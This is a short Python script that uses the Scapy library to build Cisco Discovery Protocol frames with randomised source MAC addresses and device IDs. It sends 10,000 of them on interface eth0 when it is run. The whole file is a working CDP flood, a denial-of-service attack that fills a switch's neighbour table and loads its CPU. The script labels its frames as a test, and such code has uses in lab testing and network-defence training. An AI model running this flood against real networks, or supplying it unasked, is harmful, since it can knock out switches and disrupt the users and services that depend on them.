from scapy.all import *
from scapy.layers.l2 import *

# Create a single CDP frame
def create_cdp_packet():
    return (
        Ether(dst="01:00:0c:cc:cc:cc", src=RandMAC()) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
        SNAP(OUI=0x00000c, code=0x2000) /
        CDP(version=2, ttl=180) /
        CDPMsgDeviceID(val=RandString(10)) /
        CDPMsgSoftwareVersion(val="Scapy Test CDP Flood") /
        CDPMsgPlatform(val="Scapy Generated")
    )

# Flood the switch with CDP packets
def cdp_flood(iface, count):
    for _ in range(count):
        pkt = create_cdp_packet()
        sendp(pkt, iface=iface, verbose=False)


cdp_flood(iface="eth0", count=10000)

